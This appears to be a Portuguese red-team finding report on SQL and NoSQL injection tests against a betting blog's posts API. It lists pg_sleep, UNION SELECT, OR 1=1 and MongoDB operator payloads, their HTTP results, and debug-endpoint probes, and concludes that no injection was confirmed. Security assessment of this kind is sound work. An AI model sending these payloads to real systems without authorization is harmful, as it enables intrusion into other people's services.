# F-018: SQLi PostgreSQL - Payloads Negativos

## Severidade: 🟡 BAIXO (nenhuma vulnerabilidade confirmada)

## Descrição
Testes de SQL Injection e NoSQL Injection contra `blog.ice.bet.br/api/posts` utilizando payloads PostgreSQL e MongoDB. **Nenhuma injeção foi confirmada.**

## Payloads Testados

### SQLi Time-based (PostgreSQL)
```bash
# Normal
where={"createdAt":{"greater_than":"2026-01-01"}}
→ HTTP 200 | Time: 4892ms

# pg_sleep injection
where={"createdAt":{"greater_than":"2026-01-01' OR 1=1 AND 1=pg_sleep(5)--"}}
→ HTTP 200 | Time: 1070ms
```
**Conclusão**: Sem delay adicional, pg_sleep não foi executado.

### SQLi Classic
```bash
# UNION SELECT
where={"title":{"like":"' UNION SELECT 1--"}}
→ HTTP 200 | Tamanho: 102470 bytes

# OR 1=1
where={"title":{"equals":"' OR 1=1--"}}
→ HTTP 200 | Tamanho: 102470 bytes

# ID manipulation
where={"id":{"equals":"1 OR 1=1"}}
→ HTTP 200 | Tamanho: 102471 bytes

where={"id":{"equals":"1 UNION SELECT 1,2,3,4,5"}}
→ HTTP 200 | Tamanho: 102471 bytes
```
**Conclusão**: Payloads são tratados como strings literais pelo ORM.

### NoSQL Injection (MongoDB)
```bash
# $regex operator
where={"title":{"$regex":".*"}}
→ HTTP 200 | Tamanho: 102470 bytes

# $ne operator
where={"id":{"$ne":0}}
→ HTTP 200 | Tamanho: 102470 bytes

# $where operator
where={"$where":"1"}
→ HTTP 200 | Tamanho: 102470 bytes

# Deep nested
where={"$or":[{"title":{"$regex":".*"}}]}
→ HTTP 200 | Tamanho: 102470 bytes
```
**Conclusão**: Operadores NoSQL não são interpretados. A API usa um parser JSON que filtra esses caracteres.

### ORDER BY injection
```bash
sort=title ASC;--
→ HTTP 200 (sem variação)
```
**Conclusão**: Sem injeção no parâmetro de ordenação.

### Blind Timing
```bash
Condition id=1: 10018ms
Condition id=999999: 10023ms
```
**Conclusão**: Tempos praticamente idênticos. Ambos ~10s indicam timeout do proxy, não timing attack.

### Outros Endpoints
```bash
/api/config → 404
/api/settings → 404
/api/env → 404
/api/db → 404
/api/status → 404
/api/info → 404
/api/_debug → 404
```
**Conclusão**: Endpoints de debug/config não estão expostos.

## Análise
- **ORM Seguro**: O sistema usa um ORM (provavelmente Strapi) que sanitiza entradas
- **Parser JSON**: O parâmetro `where` é parseado como JSON e os valores são tratados como strings
- **Não há evidência de SQLi**: Todos os payloads retornaram o mesmo resultado do baseline
- **CVE-2026-25544**: Não foi confirmada (os payloads não afetaram o comportamento)

## Recomendações
- Continuar monitorando CVE-2026-25544
- Testar em versões futuras do Strapi
- Verificar outros endpoints que possam usar o mesmo parâmetro `where`
- Considerar testes com codificação double-URL

## Evidência
- Logs de requests em `/home/ubuntu/red-team-operator/ice.bet.br/evidence/`